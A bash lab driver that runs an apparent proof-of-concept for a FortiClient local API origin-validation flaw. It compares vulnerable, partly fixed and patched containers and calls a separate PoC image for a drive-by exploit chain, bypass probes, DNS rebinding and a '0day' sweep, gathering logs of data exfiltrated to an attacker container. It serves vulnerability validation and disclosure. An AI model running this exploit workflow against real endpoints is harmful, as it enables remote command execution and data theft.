#!/usr/bin/env bash
# CVE-2026-121529 lab driver -- FortiClient local API origin validation error.
#
#   ./run-lab.sh up         build the images and start the endpoint + attacker site
#   ./run-lab.sh check      A/B differential (vulnerable model vs patched model)
#   ./run-lab.sh exploit    full drive-by exploit chain against the vulnerable model
#   ./run-lab.sh mitigation CORS-header-only remediation: execution survives, exfil does not
#   ./run-lab.sh probe      origin-validation bypass matrix against the patched model
#   ./run-lab.sh rebind     DNS-rebinding style attack against the patched model
#   ./run-lab.sh raw        raw-socket HTTP probes against the patched model
#   ./run-lab.sh 0day       full sweep
#   ./run-lab.sh evidence   collect everything into evidence/
#   ./run-lab.sh down       tear down
set -uo pipefail

cd "$(dirname "$0")"

NET=cve121529lab
LAB_IMG=cve-2026-121529:vuln
POC_IMG=cve-2026-121529-poc:local
VULN_SRV=forticlient-vuln
CORS_SRV=forticlient-fixed-cors
ORIGIN_SRV=forticlient-fixed-origin-only
STRICT_SRV=forticlient-fixed-strict
ATT_SRV=attacker-site
RESULTS="$PWD/results"
OUT=evidence
ATTACKER="http://$ATT_SRV:8080"

log() { printf '\n\033[1;36m==> %s\033[0m\n' "$*"; }

poc_for() {
    local srv="$1"; shift
    podman run --rm --cpus 2 --memory 4g --network "container:$srv" \
        -v "$RESULTS:/results" "$POC_IMG" "$@"
}

cmd_up_only() {
    log "starting the endpoint containers and the attacker site"
    mkdir -p "$RESULTS/poc" "$RESULTS/marker"
    podman rm -f "$VULN_SRV" "$CORS_SRV" "$ORIGIN_SRV" "$STRICT_SRV" "$ATT_SRV" >/dev/null 2>&1 || true
    podman run -d --name "$VULN_SRV" --network "$NET" --cpus 2 --memory 4g \
        -e FCT_MODE=vuln -v "$RESULTS:/results" "$LAB_IMG" >/dev/null
    podman run -d --name "$CORS_SRV" --network "$NET" --cpus 2 --memory 4g \
        -e FCT_MODE=fixed-cors -v "$RESULTS:/results" "$LAB_IMG" >/dev/null
    podman run -d --name "$ORIGIN_SRV" --network "$NET" --cpus 2 --memory 4g \
        -e FCT_MODE=fixed-origin-only -v "$RESULTS:/results" "$LAB_IMG" >/dev/null
    podman run -d --name "$STRICT_SRV" --network "$NET" --cpus 2 --memory 4g \
        -e FCT_MODE=fixed-strict -v "$RESULTS:/results" "$LAB_IMG" >/dev/null
    podman run -d --name "$ATT_SRV" --network "$NET" --cpus 2 --memory 4g \
        --entrypoint python3 -v "$RESULTS:/results" "$LAB_IMG" \
        -u /opt/lab/attacker_server.py >/dev/null
    sleep 3
    podman ps --format '{{.Names}}\t{{.Status}}\t{{.Image}}' \
        | grep -E "forticlient-|attacker-site" || true
}

cmd_up() {
    log "building images"
    podman network exists "$NET" || podman network create "$NET"
    podman build --network host -f lab/Containerfile -t "$LAB_IMG" .
    podman build --network host -f poc/Containerfile -t "$POC_IMG" poc/
    cmd_up_only
}

cmd_check() {
    cmd_up_only
    log "A/B differential: vulnerable model (7.4.7) vs patched model (7.4.8)"
    echo
    echo "--- vulnerable model: FortiClient 7.4.7 ---"
    poc_for "$VULN_SRV" check --target http://127.0.0.1:9191 --attacker "$ATTACKER"
    local rc_vuln=$?
    echo
    echo "--- patched model: server-side origin validation ---"
    poc_for "$STRICT_SRV" check --target http://127.0.0.1:9191 --attacker "$ATTACKER"
    local rc_fixed=$?
    echo
    if [ "$rc_vuln" -eq 1 ] && [ "$rc_fixed" -eq 0 ]; then
        echo "RESULT: differential confirmed (vulnerable exploitable, patched not)"
        return 0
    fi
    echo "RESULT: unexpected (vuln=$rc_vuln fixed=$rc_fixed)"
    return 1
}

cmd_exploit() {
    cmd_up_only
    log "full drive-by exploit chain against the vulnerable model"
    poc_for "$VULN_SRV" exploit --target http://127.0.0.1:9191 --attacker "$ATTACKER"
    local rc=$?
    log "command output produced on the endpoint"
    cat "$RESULTS/marker/browser-pwn.txt" 2>/dev/null || true
    echo
    log "data exfiltrated to the attacker site"
    cat "$RESULTS/exfil.jsonl" 2>/dev/null | tail -n 3 || true
    return $rc
}

cmd_mitigation() {
    cmd_up_only
    log "CORS-header-only remediation model"
    poc_for "$CORS_SRV" mitigation --target http://127.0.0.1:9191 --attacker "$ATTACKER"
    return $?
}

cmd_ws() {
    cmd_up_only
    log "WebSocket surface -- no CORS policy governs it"
    poc_for "$CORS_SRV" ws --target http://127.0.0.1:9191 --attacker "$ATTACKER"
    return $?
}

cmd_probe() {
    cmd_up_only
    log "origin-validation bypass matrix against the patched model"
    poc_for "$STRICT_SRV" probe --target http://127.0.0.1:9191 --attacker "$ATTACKER"
    return $?
}

cmd_rebind() {
    cmd_up_only
    log "DNS-rebinding style attack against the patched model"
    poc_for "$STRICT_SRV" rebind --target http://127.0.0.1:9191 --attacker "$ATTACKER"
    return $?
}

cmd_raw() {
    cmd_up_only
    log "raw-socket HTTP probes against the patched model"
    poc_for "$STRICT_SRV" raw --target http://127.0.0.1:9191 --attacker "$ATTACKER"
    return $?
}

cmd_0day() {
    cmd_up_only
    log "full sweep against the patched model"
    poc_for "$STRICT_SRV" 0day --target http://127.0.0.1:9191 --attacker "$ATTACKER"
    return $?
}

cmd_evidence() {
    cmd_up_only
    mkdir -p "$OUT"
    log "collecting evidence into $OUT/"

    {
        echo "=== timestamp ==="; date -u
        echo; echo "=== endpoint models ==="
        for s in "$VULN_SRV" "$CORS_SRV" "$ORIGIN_SRV" "$STRICT_SRV"; do
            printf '%-28s ' "$s"
            podman exec "$s" printenv FCT_MODE 2>/dev/null || echo "(gone)"
        done
        echo; echo "=== listener ==="
        podman exec "$VULN_SRV" python3 -c \
            "import socket;s=socket.create_connection(('127.0.0.1',9191),3);print('127.0.0.1:9191 reachable');s.close()" 2>&1
    } > "$OUT/versions.txt" 2>&1

    poc_for "$VULN_SRV" check --target http://127.0.0.1:9191 --attacker "$ATTACKER" \
        > "$OUT/check-vulnerable-run.txt" 2>&1
    echo "check-vulnerable-run exit=$?" >> "$OUT/check-vulnerable-run.txt"

    poc_for "$VULN_SRV" exploit --target http://127.0.0.1:9191 --attacker "$ATTACKER" \
        > "$OUT/exploit-vulnerable-run.txt" 2>&1
    echo "exploit-vulnerable-run exit=$?" >> "$OUT/exploit-vulnerable-run.txt"

    poc_for "$STRICT_SRV" check --target http://127.0.0.1:9191 --attacker "$ATTACKER" \
        > "$OUT/check-fixed-run.txt" 2>&1
    echo "check-fixed-run exit=$?" >> "$OUT/check-fixed-run.txt"

    poc_for "$ORIGIN_SRV" check --target http://127.0.0.1:9191 --attacker "$ATTACKER" \
        > "$OUT/check-fixed-origin-only-run.txt" 2>&1
    echo "check-fixed-origin-only-run exit=$?" >> "$OUT/check-fixed-origin-only-run.txt"

    poc_for "$CORS_SRV" mitigation --target http://127.0.0.1:9191 --attacker "$ATTACKER" \
        > "$OUT/mitigation-cors-header-only-run.txt" 2>&1
    echo "mitigation-cors-header-only-run exit=$?" >> "$OUT/mitigation-cors-header-only-run.txt"

    poc_for "$STRICT_SRV" probe --target http://127.0.0.1:9191 --attacker "$ATTACKER" \
        > "$OUT/0day-bypass-matrix.txt" 2>&1
    echo "probe exit=$?" >> "$OUT/0day-bypass-matrix.txt"

    poc_for "$STRICT_SRV" rebind --target http://127.0.0.1:9191 --attacker "$ATTACKER" \
        > "$OUT/0day-dns-rebind.txt" 2>&1
    echo "rebind exit=$?" >> "$OUT/0day-dns-rebind.txt"

    poc_for "$STRICT_SRV" raw --target http://127.0.0.1:9191 --attacker "$ATTACKER" \
        > "$OUT/0day-raw-http-probes.txt" 2>&1
    echo "raw exit=$?" >> "$OUT/0day-raw-http-probes.txt"

    poc_for "$CORS_SRV" ws --target http://127.0.0.1:9191 --attacker "$ATTACKER" \
        > "$OUT/0day-websocket-surface.txt" 2>&1
    echo "ws exit=$?" >> "$OUT/0day-websocket-surface.txt"

    poc_for "$VULN_SRV" raw --target http://127.0.0.1:9191 --attacker "$ATTACKER" \
        > "$OUT/0day-raw-http-probes-vulnerable.txt" 2>&1
    echo "raw-vuln exit=$?" >> "$OUT/0day-raw-http-probes-vulnerable.txt"

    log "four-way differential table"
    cmd_differential > "$OUT/differential-table.txt" 2>&1
    tail -n 8 "$OUT/differential-table.txt"

    log "endpoint-side request log"
    {
        echo "=== FortiClient 7.4.7 model (vulnerable) ==="
        cat "$RESULTS/api-vuln.jsonl" 2>/dev/null || echo "(none)"
        echo
        echo "=== patched model (server-side origin validation) ==="
        cat "$RESULTS/api-fixed-strict.jsonl" 2>/dev/null || echo "(none)"
        echo
        echo "=== CORS-header-only remediation model ==="
        cat "$RESULTS/api-fixed-cors.jsonl" 2>/dev/null || echo "(none)"
        echo
        echo "=== origin-validated remediation model (no Origin accepted) ==="
        cat "$RESULTS/api-fixed-origin-only.jsonl" 2>/dev/null || echo "(none)"
    } > "$OUT/server-request-logs.txt" 2>&1

    log "attacker-side exfiltration log"
    cp "$RESULTS/exfil.jsonl" "$OUT/attacker-exfiltration.txt" 2>/dev/null || true

    log "command output produced on the endpoint"
    cp "$RESULTS/marker/browser-pwn.txt" "$OUT/endpoint-command-output.txt" 2>/dev/null || true

    ls -la "$OUT"
}

cmd_differential() {
    cmd_up_only
    log "four-way differential across the origin-validation models"
    local tmp
    tmp="$(mktemp -d)"
    poc_for "$VULN_SRV"   check --target http://127.0.0.1:9191 --attacker "$ATTACKER" > "$tmp/vuln.json" 2>&1
    poc_for "$CORS_SRV"   check --target http://127.0.0.1:9191 --attacker "$ATTACKER" > "$tmp/cors.json" 2>&1
    poc_for "$ORIGIN_SRV" check --target http://127.0.0.1:9191 --attacker "$ATTACKER" > "$tmp/origin.json" 2>&1
    poc_for "$STRICT_SRV" check --target http://127.0.0.1:9191 --attacker "$ATTACKER" > "$tmp/strict.json" 2>&1
    python3 - "$tmp" <<'PY'
import json, os, sys
tmp = sys.argv[1]
rows = [
    ("vuln", "FortiClient 7.4.7 model (no origin validation)", "vuln.json"),
    ("fixed-cors", "CORS-header-only remediation", "cors.json"),
    ("fixed-origin-only", "server-side origin validation, no Origin accepted", "origin.json"),
    ("fixed-strict", "server-side origin validation + shared secret", "strict.json"),
]
print("%-18s %-50s %-8s %-8s %-8s %-8s %-9s %-6s" % (
    "model", "behaviour", "exec", "read", "img", "ws", "confirmed", "exit"))
print("-" * 122)
for key, label, fn in rows:
    p = os.path.join(tmp, fn)
    try:
        t = open(p).read()
        d = json.loads(t[t.find("{"):t.rfind("}") + 1])
        s = d["summary"]
        print("%-18s %-50s %-8s %-8s %-8s %-8s %-9s %-6s" % (
            key, label, s.get("executed"), s.get("readable"),
            s.get("img_csrf_executed"), s.get("websocket_executed"),
            s.get("confirmed"), d.get("exit_code")))
    except Exception as exc:
        print("%-18s %-50s  <unreadable: %r>" % (key, label, exc))
PY
    rm -rf "$tmp"
}

cmd_down() {
    podman rm -f "$VULN_SRV" "$CORS_SRV" "$ORIGIN_SRV" "$STRICT_SRV" "$ATT_SRV" >/dev/null 2>&1 || true
    echo "containers removed"
}

case "${1:-up}" in
    up)         cmd_up ;;
    check)      cmd_check ;;
    exploit)    cmd_exploit ;;
    mitigation) cmd_mitigation ;;
    ws)         cmd_ws ;;
    probe)      cmd_probe ;;
    rebind)     cmd_rebind ;;
    raw)        cmd_raw ;;
    0day)       cmd_0day ;;
    differential) cmd_differential ;;
    evidence)   cmd_evidence ;;
    down)       cmd_down ;;
    *) echo "usage: $0 {up|check|exploit|mitigation|ws|probe|rebind|raw|0day|differential|evidence|down}"; exit 2 ;;
esac
